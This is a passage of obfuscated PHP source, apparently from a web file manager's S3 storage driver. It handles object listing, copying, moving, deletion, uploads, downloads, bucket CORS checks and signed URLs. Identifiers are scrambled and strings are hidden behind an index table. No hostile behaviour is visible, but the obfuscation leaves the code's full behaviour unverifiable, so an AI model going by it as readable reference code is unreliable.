$¹±–¾Öô, $¹±–¾Öô * 10); if (@file_exists($™öˆ¹ïá)) { Cache::remove($Û„‡æˆı); return IO::move($™öˆ¹ïá, $½ıĞ•›ö); } Cache::set($Û„‡æˆı, $Ö»×şº[206], 600); del_file($™öˆ¹ïá); return $Ö»×şº[215] . $õéåùäÈ . $Ö»×şº[84]; } public function fileOutImageServer($âŒÕÄË‘, $€èâÎ”Ñ = 250) { $this->fileOutImage($âŒÕÄË‘, $€èâÎ”Ñ); } public function fileNameAuto($ºßèŞö¬, $Ï¡Ñ¹»Ö, $ó·­á£¸ = REPEAT_RENAME, $Ê‚ÄúÇØ = false) { $–‡Ó©êÌ =& $_SERVER[è¶³ÒßÑ]; $÷õ³«ËÆ = $ºßèŞö¬ === $–‡Ó©êÌ[12] ? $Ï¡Ñ¹»Ö : rtrim($ºßèŞö¬, $–‡Ó©êÌ[8]) . $–‡Ó©êÌ[8] . $Ï¡Ñ¹»Ö; if ($ó·­á£¸ == REPEAT_REPLACE || !$this->exist($÷õ³«ËÆ) || $Ê‚ÄúÇØ && $ó·­á£¸ != REPEAT_RENAME_FOLDER) { return $Ï¡Ñ¹»Ö; } if ($ó·­á£¸ == REPEAT_SKIP) { return !1; } $Ôöõ¢™ = $–‡Ó©êÌ[10] . get_path_ext($Ï¡Ñ¹»Ö); $Ôöõ¢™ = $Ôöõ¢™ == $–‡Ó©êÌ[10] || $Ê‚ÄúÇØ ? $–‡Ó©êÌ[12] : $Ôöõ¢™; $Ñıš¥™ = 1; $ëèêÛ®ï = substr($Ï¡Ñ¹»Ö, 0, strlen($Ï¡Ñ¹»Ö) - strlen($Ôöõ¢™)); $İŒ‚è³è = $ëèêÛ®ï . "\x28{$Ñıš¥™}\x29{$Ôöõ¢™}"; while ($this->exist(rtrim($ºßèŞö¬, $–‡Ó©êÌ[8]) . $–‡Ó©êÌ[8] . $İŒ‚è³è)) { $İŒ‚è³è = $ëèêÛ®ï . "\50{$Ñıš¥™}\51{$Ôöõ¢™}"; $Ñıš¥™++; } return $İŒ‚è³è; } private function fileNameAutoList($àé¶°¬”, $‚€±áùœ, $ä¼®ºı· = false) { $öá‹Ö« =& $_SERVER[è¶³ÒßÑ]; $¾Ëõ´Íª = $this->listPath($àé¶°¬”, !0); $¾Ëõ´Íª = array_merge($¾Ëõ´Íª[$öá‹Ö«[95]], $¾Ëõ´Íª[$öá‹Ö«[96]]); $æûŠÁôà = array_to_keyvalue($¾Ëõ´Íª, $öá‹Ö«[12], $öá‹Ö«[32]); $ÛºÖÖÕø = $öá‹Ö«[10] . get_path_ext($‚€±áùœ); $ÛºÖÖÕø = $ÛºÖÖÕø == $öá‹Ö«[10] || $ä¼®ºı· ? $öá‹Ö«[12] : $ÛºÖÖÕø; $ë¢ƒ“ÓÒ = substr($‚€±áùœ, 0, strlen($‚€±áùœ) - strlen($ÛºÖÖÕø)); $õœ«ßñ‘ = $ë¢ƒ“ÓÒ . "\50\60\x29{$ÛºÖÖÕø}"; for ($›ä÷¤×… = 1; $›ä÷¤×… <= count($æûŠÁôà) + 1; $›ä÷¤×…++) { $õœ«ßñ‘ = $ë¢ƒ“ÓÒ . "\50{$›ä÷¤×…}\x29{$ÛºÖÖÕø}"; if (!in_array_not_case($õœ«ßñ‘, $æûŠÁôà)) { return $õœ«ßñ‘; } } return $õœ«ßñ‘; } public function listAllFiles($ã½¤ìè, $ïÆÀºµ±) { $¬âñ—Ù‰ =& $_SERVER[è¶³ÒßÑ]; if (empty($ïÆÀºµ±)) { return array(); } $…²İØÒ = array_keys($ïÆÀºµ±); $À²¨Å¸é = array(); $ã½¤ìè = trim($ã½¤ìè, $¬âñ—Ù‰[8]); foreach ($ïÆÀºµ± as $²Í¸·ç => $˜„í¶‚€) { $±Î˜ø›ù = ltrim(substr(trim($²Í¸·ç, $¬âñ—Ù‰[8]), strlen($ã½¤ìè)), $¬âñ—Ù‰[8]); if (substr($²Í¸·ç, -1) == $¬âñ—Ù‰[8]) { $±Î˜ø›ù = rtrim($±Î˜ø›ù, $¬âñ—Ù‰[8]) . $¬âñ—Ù‰[8]; } $À²¨Å¸é = array_merge($À²¨Å¸é, $this->slicePath($±Î˜ø›ù)); } $‹•ÆÉ× = array(); foreach (array_unique($À²¨Å¸é) as $Ô¦„·³) { $´´üœ = array($¬âñ—Ù‰[97] => $this->getPathOuter($¬âñ—Ù‰[8] . $ã½¤ìè . $¬âñ—Ù‰[8] . $Ô¦„·³), $¬âñ—Ù‰[88] => 1, $¬âñ—Ù‰[89] => 0); if (substr($Ô¦„·³, -1) != $¬âñ—Ù‰[8]) { $´´üœ[$¬âñ—Ù‰[88]] = 0; $··çÒ‘¹ = $this->getPath($ã½¤ìè . $¬âñ—Ù‰[8] . $Ô¦„·³); if (isset($ïÆÀºµ±[$··çÒ‘¹])) { $º˜î±£ = $ïÆÀºµ±[$··çÒ‘¹]; if (isset($º˜î±£[$¬âñ—Ù‰[89]])) { $´´üœ[$¬âñ—Ù‰[89]] = intval($º˜î±£[$¬âñ—Ù‰[89]]); } if (isset($º˜î±£[$¬âñ—Ù‰[216]])) { $´´üœ[$¬âñ—Ù‰[98]] = intval($º˜î±£[$¬âñ—Ù‰[216]]); } } } $‹•ÆÉ×[] = $´´üœ; } return $‹•ÆÉ×; } public function slicePath($¾ªÉ‰ĞŠ) { $ÊÌË»‰ =& $_SERVER[è¶³ÒßÑ]; $İÅÍêé = explode($ÊÌË»‰[8], trim($¾ªÉ‰ĞŠ, $ÊÌË»‰[8])); $ÁŒŠƒª„ = 0; do { ++$ÁŒŠƒª„; $Óşßˆ¦[] = implode($ÊÌË»‰[8], array_slice($İÅÍêé, 0, $ÁŒŠƒª„)) . $ÊÌË»‰[8]; } while ($ÁŒŠƒª„ < count($İÅÍêé)); $Óşßˆ¦[count($İÅÍêé) - 1] = $¾ªÉ‰ĞŠ; return $Óşßˆ¦; } public function getHost() { $›Ë•åè§ =& $_SERVER[è¶³ÒßÑ]; $ÉÀòÅËŸ = parse_url(trim($this->domain, $›Ë•åè§[8])); $°ü…Ã„› = isset($ÉÀòÅËŸ[$›Ë•åè§[217]]) ? $ÉÀòÅËŸ[$›Ë•åè§[217]] : http_type(); $Ë”³Ä¡” = isset($ÉÀòÅËŸ[$›Ë•åè§[218]]) ? $ÉÀòÅËŸ[$›Ë•åè§[218]] : $ÉÀòÅËŸ[$›Ë•åè§[97]]; if (isset($ÉÀòÅËŸ[$›Ë•åè§[219]])) { $Ë”³Ä¡” .= $›Ë•åè§[4] . $ÉÀòÅËŸ[$›Ë•åè§[219]]; } return $°ü…Ã„› . $›Ë•åè§[220] . $Ë”³Ä¡”; } public function pathEncode($ïèÕ¾æÍ) { $­ Í ø½ =& $_SERVER[è¶³ÒßÑ]; return str_replace($­ Í ø½[221], $­ Í ø½[8], rawurlencode($ïèÕ¾æÍ)); } public function writeLog($«ª¦ØÂˆ = '', $çÔÌ¿® = false) { $ïú™î =& $_SERVER[è¶³ÒßÑ]; $²×”õ² = in_array(ACTION, array($ïú™î[222], $ïú™î[223])); if (!$²×”õ² && !GLOBAL_DEBUG) { return; } $“¤ú—–¶ = $«ª¦ØÂˆ; static $²á›ã¡ò = null; if (!$²á›ã¡ò) { $²á›ã¡ò = strtoupper($this->getType()); } $«ª¦ØÂˆ = $²á›ã¡ò . $ïú™î[224] . $«ª¦ØÂˆ; if ($çÔÌ¿®) { $œ¶®àà = error_get_last(); if ($œ¶®àà) { $«ª¦ØÂˆ = array($«ª¦ØÂˆ, $œ¶®àà); } } write_log($«ª¦ØÂˆ, $ïú™î[225]); if ($²×”õ²) { throw new Exception($“¤ú—–¶); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($‰¥ò‘ÒÒ) { set_timeout(); require_once SDK_DIR . $_SERVER[è¶³ÒßÑ][226]; parent::__construct(); $this->_init($‰¥ò‘ÒÒ); } public function _init($Ö˜±¢ŞÍ) { $ÛíæÂ€Ş =& $_SERVER[è¶³ÒßÑ]; $this->config = $Ö˜±¢ŞÍ; foreach ($Ö˜±¢ŞÍ as $û™ä†ˆ => $îÀúüÁî) { if (isset($this->{$û™ä†ˆ})) { $this->{$û™ä†ˆ} = $îÀúüÁî; } } $this->endpoint = $Ö˜±¢ŞÍ[$ÛíæÂ€Ş[227]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($ÛíæÂ€Ş[222], $ÛíæÂ€Ş[223]))) { $this->client->setExceptions(); } } public function setSignVersion($Ğ¹­¤Î = "\166\64") { $this->signVer = $Ğ¹­¤Î; $this->client->setSignatureVersion($Ğ¹­¤Î); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $Åé— †Û) { return null; } } public function isBucketCors() { $«õÓ§¿â =& $_SERVER[è¶³ÒßÑ]; $¯¾¡¢È” = $this->getBucketCors(); if (!$¯¾¡¢È” || !is_array($¯¾¡¢È”)) { return !1; } if (!is_array($¯¾¡¢È”[$«õÓ§¿â[228]])) { $¯¾¡¢È”[$«õÓ§¿â[228]] = explode($«õÓ§¿â[50], $¯¾¡¢È”[$«õÓ§¿â[228]]); } if ($¯¾¡¢È”[$«õÓ§¿â[229]] != $«õÓ§¿â[230] || !in_array($«õÓ§¿â[230], $¯¾¡¢È”[$«õÓ§¿â[228]])) { return !1; } $âğÊ¾é¥ = array_map($«õÓ§¿â[231], $¯¾¡¢È”[$«õÓ§¿â[232]]); if (!is_array($âğÊ¾é¥)) { $âğÊ¾é¥ = array(); } $×Üè“²˜ = array($«õÓ§¿â[233], $«õÓ§¿â[234], $«õÓ§¿â[235], $«õÓ§¿â[236], $«õÓ§¿â[237]); $ãØ¶İ‰˜ = array_diff($×Üè“²˜, $âğÊ¾é¥); return empty($ãØ¶İ‰˜); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($šÈæ§ˆâ, $œıØ×É† = '', $‹›™ÚÎÃ = REPEAT_RENAME) { $ÛÎìõöä = $this->setContent($šÈæ§ˆâ, $œıØ×É†); if ($ÛÎìõöä !== !1) { return $this->getPathOuter($šÈæ§ˆâ); } return !1; } public function mkdir($êõó‰ç½, $õ´çİ²Á = REPEAT_SKIP) { $à…ñ½·Ç =& $_SERVER[è¶³ÒßÑ]; if (empty($êõó‰ç½) && $êõó‰ç½ !== $à…ñ½·Ç[238]) { return !1; } if ($õ´çİ²Á && $this->_isFolder($êõó‰ç½)) { return $this->getPathOuter($êõó‰ç½); } $Çºü©· = $this->setContent($êõó‰ç½, $à…ñ½·Ç[12], !0); if ($Çºü©· !== !1) { return $this->getPathOuter($êõó‰ç½); } return !1; } public function copyFile($ñïÂ²ÛÊ, $Î¢¨×Ê», $øšƒ“êß = array()) { $›òëŠ˜¼ =& $_SERVER[è¶³ÒßÑ]; $ËçĞÙÆŒ = $this->objectMeta($ñïÂ²ÛÊ); if (!$ËçĞÙÆŒ) { return !1; } if ($ËçĞÙÆŒ[$›òëŠ˜¼[89]] <= 1024 * 1024 * 200) { $¢öÑò¶ = $this->client->copyObject($this->bucket, $ñïÂ²ÛÊ, $this->bucket, $Î¢¨×Ê», $›òëŠ˜¼[239], $øšƒ“êß); } else { $¢öÑò¶ = $this->client->multiCopyObject($this->bucket, $ñïÂ²ÛÊ, $this->bucket, $Î¢¨×Ê», $øšƒ“êß); } $¢öÑò¶ = $¢öÑò¶ ? $this->getPathOuter($Î¢¨×Ê») : !1; return $¢öÑò¶; } public function moveFile($âÜ×š…Â, $ÂñŒ¯®ì) { if ($this->copyFile($âÜ×š…Â, $ÂñŒ¯®ì)) { $this->delFile($âÜ×š…Â); return $this->getPathOuter($ÂñŒ¯®ì); } return !1; } public function delFile($òêá¼“Ô) { return $this->client->deleteObject($this->bucket, $òêá¼“Ô); } public function delFolder($—ÔåŠ™¨) { $¨µşÁÅò =& $_SERVER[è¶³ÒßÑ]; if (!$this->exist($—ÔåŠ™¨)) { return !0; } $this->listItemCache = !1; $´íŒÂ“‘ = $this->fileList($—ÔåŠ™¨); $this->listItemCache = !0; $›Ï®©ö = trim($—ÔåŠ™¨, $¨µşÁÅò[8]) . $¨µşÁÅò[8]; if (!empty($—ÔåŠ™¨) && $—ÔåŠ™¨ !== $¨µşÁÅò[238] && !in_array($›Ï®©ö, $´íŒÂ“‘[$¨µşÁÅò[95]])) { $´íŒÂ“‘[$¨µşÁÅò[95]][] = $›Ï®©ö; } $­ş¿İ· = $this->delByBatch($´íŒÂ“‘[$¨µşÁÅò[96]]); if (!$­ş¿İ·) { return !1; } $­ş¿İ· = $this->delByBatch($´íŒÂ“‘[$¨µşÁÅò[95]]); if (!$­ş¿İ·) { return !1; } return $this->delFile($›Ï®©ö); } private function delByBatch($Õ‘“ÆÛ¼) { foreach (array_chunk($Õ‘“ÆÛ¼, 1000) as $½Í÷ü …) { $ü¬û–õ“ = $this->client->deleteObjects($this->bucket, $½Í÷ü …); if (!$ü¬û–õ“) { return !1; } } return !0; } public function rename($ÑùËù¤Ì, $ª©—ì·) { return $this->renameObject($ÑùËù¤Ì, $ª©—ì·); } public function listPath($ÜÓäõ”, $©ê¿Ç› = false) { $Ğû¡âŒ =& $_SERVER[è¶³ÒßÑ]; $„‡ÓÈëö = $this->fileList($ÜÓäõ”, $Ğû¡âŒ[8], !0); foreach ($„‡ÓÈëö[$Ğû¡âŒ[95]] as $»¸¼Ğªœ => $œğšîª‚) { $„‡ÓÈëö[$Ğû¡âŒ[95]][$»¸¼Ğªœ] = $this->folderInfo($œğšîª‚, $©ê¿Ç›, $œğšîª‚); } foreach ($„‡ÓÈëö[$Ğû¡âŒ[96]] as $»¸¼Ğªœ => $œğšîª‚) { $„‡ÓÈëö[$Ğû¡âŒ[96]][$»¸¼Ğªœ] = $this->fileInfo($œğšîª‚[$Ğû¡âŒ[32]], $©ê¿Ç›, $œğšîª‚); } return $„‡ÓÈëö; } protected function infoChildren($“ã¿€‡ê, &$ÉÎİİÛ²) { $û­çà§” =& $_SERVER[è¶³ÒßÑ]; $ß·½Õò´ = $this->fileList($“ã¿€‡ê, $û­çà§”[12], !0); $ÉÎİİÛ²[$û­çà§”[91]] += count($ß·½Õò´[$û­çà§”[95]]); $ÉÎİİÛ²[$û­çà§”[90]] += count($ß·½Õò´[$û­çà§”[96]]); foreach ($ß·½Õò´[$û­çà§”[96]] as $Á´·¥Æá) { if (!$Á´·¥Æá || !$Á´·¥Æá[$û­çà§”[89]]) { continue; } $ÉÎİİÛ²[$û­çà§”[89]] += $Á´·¥Æá[$û­çà§”[89]]; } } private function fileInfo($ÃÅ²şÃ, $õ´˜º­´ = false, $Ò±°Şã– = array()) { $­êË¡¡Ü =& $_SERVER[è¶³ÒßÑ]; $‡™Ó—İ = array($­êË¡¡Ü[32] => $this->pathThis($ÃÅ²şÃ), $­êË¡¡Ü[97] => $this->getPathOuter($ÃÅ²şÃ), $­êË¡¡Ü[33] => $­êË¡¡Ü[240], $­êË¡¡Ü[179] => $this->ext($ÃÅ²şÃ), $­êË¡¡Ü[89] => isset($Ò±°Şã–[$­êË¡¡Ü[89]]) ? $Ò±°Şã–[$­êË¡¡Ü[89]] : 0); if ($õ´˜º­´) { return $‡™Ó—İ; } $‡™Ó—İ[$­êË¡¡Ü[241]] = $‡™Ó—İ[$­êË¡¡Ü[98]] = 0; $‡™Ó—İ[$­êË¡¡Ü[242]] = $‡™Ó—İ[$­êË¡¡Ü[243]] = !0; if (empty($Ò±°Şã–)) { $Ò±°Şã– = $this->objectMeta($ÃÅ²şÃ); if (!$Ò±°Şã–) { return $‡™Ó—İ; } } if (isset($Ò±°Şã–[$­êË¡¡Ü[244]]) && $Ò±°Şã–[$­êË¡¡Ü[244]]) { $‡™Ó—İ[$­êË¡¡Ü[245]] = $Ò±°Şã–[$­êË¡¡Ü[244]]; } if (isset($Ò±°Şã–[$­êË¡¡Ü[216]])) { $‡™Ó—İ[$­êË¡¡Ü[98]] = $Ò±°Şã–[$­êË¡¡Ü[216]]; } if (isset($Ò±°Şã–[$­êË¡¡Ü[89]])) { $‡™Ó—İ[$­êË¡¡Ü[89]] = $Ò±°Şã–[$­êË¡¡Ü[89]]; } return $‡™Ó—İ; } private function folderInfo($¢À¨Ûñ›, $Ãü€Å = false, $°ŒªÒ²İ = array()) { $„™î–Ò =& $_SERVER[è¶³ÒßÑ]; $²Ÿ÷‚ÖÓ = array($„™î–Ò[32] => $this->pathThis($¢À¨Ûñ›), $„™î–Ò[97] => $this->getPathOuter($„™î–Ò[8] . $¢À¨Ûñ›), $„™î–Ò[33] => $„™î–Ò[88]); if ($Ãü€Å) { return $²Ÿ÷‚ÖÓ; } $²Ÿ÷‚ÖÓ[$„™î–Ò[241]] = $²Ÿ÷‚ÖÓ[$„™î–Ò[98]] = 0; $²Ÿ÷‚ÖÓ[$„™î–Ò[242]] = $²Ÿ÷‚ÖÓ[$„™î–Ò[243]] = !0; if ($¢À¨Ûñ› == $„™î–Ò[12]) { return $²Ÿ÷‚ÖÓ; } if (empty($°ŒªÒ²İ)) { $°ŒªÒ²İ = $this->objectMeta(trim($¢À¨Ûñ›, $„™î–Ò[8]) . $„™î–Ò[8]); } if (isset($°ŒªÒ²İ[$„™î–Ò[216]])) { $²Ÿ÷‚ÖÓ[$„™î–Ò[241]] = $°ŒªÒ²İ[$„™î–Ò[216]]; } return $²Ÿ÷‚ÖÓ; } private function fileList($”ä®­º, $ÒÃ¶‰¤î = '', $½“Ë°¹× = 0) { $ÖÎ˜Û·ı =& $_SERVER[è¶³ÒßÑ]; $³¢¯”§ô = rtrim($”ä®­º, $ÖÎ˜Û·ı[8]) . $ÖÎ˜Û·ı[8]; $–Í Ã‡Ù = $this->listObjs($³¢¯”§ô, null, null, $ÒÃ¶‰¤î); if (!$–Í Ã‡Ù) { return array($ÖÎ˜Û·ı[95] => array(), $ÖÎ˜Û·ı[96] => array()); } $“œûÑ‘ß = $Î±ª¢ = array(); foreach ($–Í Ã‡Ù[$ÖÎ˜Û·ı[246]] as $û®ó™) { $ÁÅ¯ú·Ê = $û®ó™[$ÖÎ˜Û·ı[32]]; if ($ÁÅ¯ú·Ê == $³¢¯”§ô) { continue; } $£®˜Ìâ = isset($û®ó™[$ÖÎ˜Û·ı[89]]) ? $û®ó™[$ÖÎ˜Û·ı[89]] : 0; $èªâ³Š = $£®˜Ìâ == 0 && substr($ÁÅ¯ú·Ê, strlen($ÁÅ¯ú·Ê) - 1, 1) == $ÖÎ˜Û·ı[8] ? !0 : !1; $this->cacheMethodInfoSet($ÁÅ¯ú·Ê, $èªâ³Š, $û®ó™); if ($èªâ³Š) { $“œûÑ‘ß[] = $ÁÅ¯ú·Ê; continue; } $Î±ª¢[] = $½“Ë°¹× ? $û®ó™ : $ÁÅ¯ú·Ê; } foreach ($–Í Ã‡Ù[$ÖÎ˜Û·ı[247]] as $û®ó™) { $“œûÑ‘ß[] = $û®ó™[$ÖÎ˜Û·ı[32]]; $this->cacheMethodInfoSet($û®ó™[$ÖÎ˜Û·ı[32]], !0); } $this->cacheMethodInfoSet($”ä®­º, !0); return array($ÖÎ˜Û·ı[95] => $“œûÑ‘ß, $ÖÎ˜Û·ı[96] => $Î±ª¢); } private function listObjs($Ë»‹ÙŠ—, $å¹ö¿³ï = null, $ÊıĞ´°û = null, $˜½­Àİ = null) { $¤šğº£† =& $_SERVER[è¶³ÒßÑ]; $Ë»‹ÙŠ— = trim($Ë»‹ÙŠ—, $¤šğº£†[8]); $°Ğ“Å¥­ = empty($Ë»‹ÙŠ—) && $Ë»‹ÙŠ— !== $¤šğº£†[238] ? $¤šğº£†[12] : $Ë»‹ÙŠ— . $¤šğº£†[8]; return $this->client->getBucket($this->bucket, $°Ğ“Å¥­, $å¹ö¿³ï, $ÊıĞ´°û, $˜½­Àİ, !0); } public function has($²»áúèÌ, $öŒ˜Ã»æ = false, $Õì¸†¨ì = true) { $îĞÀ½ÉÆ =& $_SERVER[è¶³ÒßÑ]; $²»áúèÌ = trim($²»áúèÌ, $îĞÀ½ÉÆ[8]); $Àíöƒ©Û = empty($²»áúèÌ) && $²»áúèÌ !== $îĞÀ½ÉÆ[238] ? $îĞÀ½ÉÆ[12] : $²»áúèÌ . $îĞÀ½ÉÆ[8]; $Ê¾Ï…ìŠ = null; $İËÒ‘«¹ = 500; $”ÅÉóÜ = $îĞÀ½ÉÆ[8]; $È‚ªĞÓä = $ñŠÑœòÄ = array(); while (!0) { $ÕÎ”ıàæ = $this->listObjs($²»áúèÌ, $Ê¾Ï…ìŠ, $İËÒ‘«¹, $”ÅÉóÜ); if (!$ÕÎ”ıàæ) { break; } $Ê¾Ï…ìŠ = $ÕÎ”ıàæ[$îĞÀ½ÉÆ[248]]; $úğ¤¡ğ = $ÕÎ”ıàæ[$îĞÀ½ÉÆ[246]]; $§¾ˆ…îÒ = $ÕÎ”ıàæ[$îĞÀ½ÉÆ[247]]; if (empty($úğ¤¡ğ) && empty($§¾ˆ…îÒ)) { break; } if (count($úğ¤¡ğ) == 1 && $úğ¤¡ğ[0][$îĞÀ½ÉÆ[32]] == $Àíöƒ©Û) { break; } if ($öŒ˜Ã»æ) { if (count($úğ¤¡ğ)) { $úğ¤¡ğ = array_column($úğ¤¡ğ, $îĞÀ½ÉÆ[32]); $È‚ªĞÓä = array_merge($È‚ªĞÓä, $úğ¤¡ğ); } if (count($§¾ˆ…îÒ)) { $§¾ˆ…îÒ = array_column($§¾ˆ…îÒ, $îĞÀ½ÉÆ[32]); $ñŠÑœòÄ = array_merge($ñŠÑœòÄ, $§¾ˆ…îÒ); } if ($Ê¾Ï…ìŠ === null) { break; } continue; } if ($Õì¸†¨ì) { if (!empty($úğ¤¡ğ)) { if (count($úğ¤¡ğ) > 1 || isset($úğ¤¡ğ[0][$îĞÀ½ÉÆ[32]]) && $úğ¤¡ğ[0][$îĞÀ½ÉÆ[32]] != $Àíöƒ©Û) { return !0; } } } else { if (!empty($§¾ˆ…îÒ)) { return !0; } } if ($Ê¾Ï…ìŠ === null) { break; } } if ($öŒ˜Ã»æ) { $È‚ªĞÓä = array_diff($È‚ªĞÓä, array($Àíöƒ©Û)); $È‚ªĞÓä = count(array_unique($È‚ªĞÓä)); $ñŠÑœòÄ = count(array_unique($ñŠÑœòÄ)); return array($îĞÀ½ÉÆ[249] => $È‚ªĞÓä, $îĞÀ½ÉÆ[250] => $ñŠÑœòÄ); } return !1; } public function listAll($ÌŞíè™Ü) { $ñÔÃ»÷ =& $_SERVER[è¶³ÒßÑ]; $Üµ§§âş = $this->fileList($ÌŞíè™Ü, $ñÔÃ»÷[12], !0); $×¥ë¶¾ = array_to_keyvalue($Üµ§§âş[$ñÔÃ»÷[96]], $ñÔÃ»÷[32]); foreach ($Üµ§§âş[$ñÔÃ»÷[95]] as $àİªÓáÊ) { if (is_string($àİªÓáÊ)) { $×¥ë¶¾[$àİªÓáÊ] = array($ñÔÃ»÷[89] => 0); } } return $this->listAllFiles($ÌŞíè™Ü, $×¥ë¶¾); } public function canRead($€îŒğŠì) { $–óÊ»ÂÏ =& $_SERVER[è¶³ÒßÑ]; $£ª¹é†ˆ = $this->client->getAccessControlPolicy($this->bucket, $€îŒğŠì); if (!$£ª¹é†ˆ) { return !1; } return in_array($£ª¹é†ˆ, array($–óÊ»ÂÏ[251], $–óÊ»ÂÏ[252], $–óÊ»ÂÏ[253])) ? !0 : !1; } public function canWrite($Ñô¿±Æö) { $¶§Û›• =& $_SERVER[è¶³ÒßÑ]; $çŸÑ‘Åõ = $this->client->getAccessControlPolicy($this->bucket, $Ñô¿±Æö); if (!$çŸÑ‘Åõ) { return !1; } return in_array($çŸÑ‘Åõ, array($¶§Û›•[251], $¶§Û›•[252])) ? !0 : !1; } public function getContent($ÀÛÉúäØ) { return $this->client->getObject($this->bucket, $ÀÛÉúäØ); } public function setContent($«æ…¥Ú, $Àåñóæ = '', $ÌÄÊÆŠŸ = false) { $ÙÎ™™©° =& $_SERVER[è¶³ÒßÑ]; $«æ…¥Ú = $ÌÄÊÆŠŸ ? trim($«æ…¥Ú, $ÙÎ™™©°[8]) . $ÙÎ™™©°[8] : $«æ…¥Ú; $ßØ‰¶·Æ = get_file_mime(get_path_ext($«æ…¥Ú)); $É™‰Î´É = $this->client->putObject($Àåñóæ, $this->bucket, $«æ…¥Ú, $ÙÎ™™©°[239], array(), $ßØ‰¶·Æ); if (!$É™‰Î´É) { return !1; } if ($ÌÄÊÆŠŸ) { return !0; } return $É™‰Î´É ? !0 : !1; } public function fileSubstr($•—ø›ã, $æÉšÔ¦ş, $Ó©İÄ—‚) { $”Ù¢ë„Œ = $æÉšÔ¦ş + $Ó©İÄ—‚ - 1; return $this->client->getObject($this->bucket, $•—ø›ã, array($_SERVER[è¶³ÒßÑ][254] => "\x62\171\164\x65\x73\75{$æÉšÔ¦ş}\55{$”Ù¢ë„Œ}")); } public function upload($É×óÀß, $òçšæà, $úœ®‚· = false, $æ¹íÛ½¦ = REPEAT_REPLACE) { $›çËÕÅÙ =& $_SERVER[è¶³ÒßÑ]; $ËÍŸæØá = array($›çËÕÅÙ[255] => @md5_file($òçšæà)); $ÕÅéÙ™Î = array($›çËÕÅÙ[256] => get_file_mime(get_path_ext($É×óÀß))); if (IO::size($òçšæà) <= 1024 * 1024 * 200) { $Ôô•”ƒü = $this->client->putObjectFile($òçšæà, $this->bucket, $É×óÀß, $›çËÕÅÙ[239], $ËÍŸæØá, $ÕÅéÙ™Î); return !empty($Ôô•”ƒü) ? $this->getPathOuter($É×óÀß) : !1; } $åÂ¡Ó¢ = $this->client->multiUploadObject($òçšæà, $this->bucket, trim($É×óÀß, $›çËÕÅÙ[8]), $ËÍŸæØá, $ÕÅéÙ™Î); return $åÂ¡Ó¢ ? $this->getPathOuter($É×óÀß) : !1; } public function download($®ËäõŒË, $àáâ¸ƒø) { if (!@is_dir($this->pathFather($àáâ¸ƒø)) && !IO::mkdir($this->pathFather($àáâ¸ƒø))) { return !1; } $§³ÇÖİÜ = $this->client->getObject($this->bucket, $®ËäõŒË, array(), $àáâ¸ƒø); return $§³ÇÖİÜ !== !1 ? $àáâ¸ƒø : !1; } public function link($›Åî“, $®‘¯Êã¨ = array()) { $–ú†‹ç¶ =& $_SERVER[è¶³ÒßÑ]; if ($this->signVer == $–ú†‹ç¶[257]) { return $this->client->getAuthenticatedURL($this->bucket, $›Åî“, 3600 * 12, $®‘¯Êã¨); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($›Åî“, $–ú†‹ç¶[8]), 3600 * 12, $this->region, array(), !0, $®‘¯Êã¨); } public function fileOut($ÙÁ¿´Âö, $İêÉŠİÓ = false, $­ê­³Æö = false, $ÃˆÚ«¬ø = '') { $¨İŸ»¶ò =& $_SERVER[è¶³ÒßÑ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÙÁ¿´Âö, $İêÉŠİÓ, $­ê­³Æö, $ÃˆÚ«¬ø); } if (!$­ê­³Æö) { $­ê­³Æö = $this->pathThis($ÙÁ¿´Âö); } $Í¹À¹ = get_file_mime(get_path_ext($­ê­³Æö)); if ($Í¹À¹ == $¨İŸ»¶ò[258]) { return parent::fileOut($ÙÁ¿´Âö, $İêÉŠİÓ, $­ê­³Æö, $ÃˆÚ«¬ø); } $úàöëÎä = array($¨İŸ»¶ò[259] => $Í¹À¹); if ($İêÉŠİÓ) { $úàöëÎä[$¨İŸ»¶ò[260]] = $¨İŸ»¶ò[261] . rawurlencode($­ê­³Æö); } else { } $Ò‹¿úÙ = $this->link($ÙÁ¿´Âö, $úàöëÎä); $this->fileOutLink($Ò‹¿úÙ); } public function fileOutServer($¤úÌÌúÈ, $ü ğõ = false, $”¹ÁˆÓû = false, $¡•Â§í  = '') { parent::fileOut($¤úÌÌúÈ, $ü ğõ, $”¹ÁˆÓû, $¡•Â§í ); } public function fileOutImageServer($‘¨†İ©ë, $‘Û‰Òá = 250) { parent::fileOutImage($‘¨†İ©ë, $‘Û‰Òá); } public function hashMd5($ÙôÑÛ¹É, $”å”¡Áê = '') { $ÛÚ†®•Ñ = $this->objectMeta($ÙôÑÛ¹É); if (!$ÛÚ†®•Ñ) { return !1; } $”å”¡Áê = $”å”¡Áê ? $”å”¡Áê : _get($ÛÚ†®•Ñ, $_SERVER[è¶³ÒßÑ][262]); return $”å”¡Áê; } public function uploadFormData($ĞŞş‡Šö, $„àÌòãÕ = 3600) { $ÂÕ§üÈ© =& $_SERVER[è¶³ÒßÑ]; $šÊò«µø = $this->pathFather($ĞŞş‡Šö); $Ô ±şÄı = $this->client->getHttpUploadPostParams($this->bucket, $šÊò«µø, $ÂÕ§üÈ©[239], $„àÌòãÕ); return array_merge((array) $Ô ±şÄı, array($ÂÕ§üÈ©[218] => $this->getHost())); } public function multiUploadFormData($¬ğËîÜ, $ıãÓ¸† = 3600) { $ãÄïš…À =& $_SERVER[è¶³ÒßÑ]; $×ı—ÊÜù = gmdate($ãÄïš…À[263]); $Ä¡ÃÇÂ = array(); $ø˜¡ˆŞ = $this->client->getUploadId($this->bucket, $¬ğËîÜ, $Ä¡ÃÇÂ); if (!$ø˜¡ˆŞ) { return !1; } return array($ãÄïš…À[264] => $ø˜¡ˆŞ, $ãÄïš…À[218] => $this->getHost() . $ãÄïš…À[8] . $this->pathEncode($¬ğËîÜ), $ãÄïš…À[265] => $×ı—ÊÜù, $ãÄïš…À[107] => $¬ğËîÜ); } 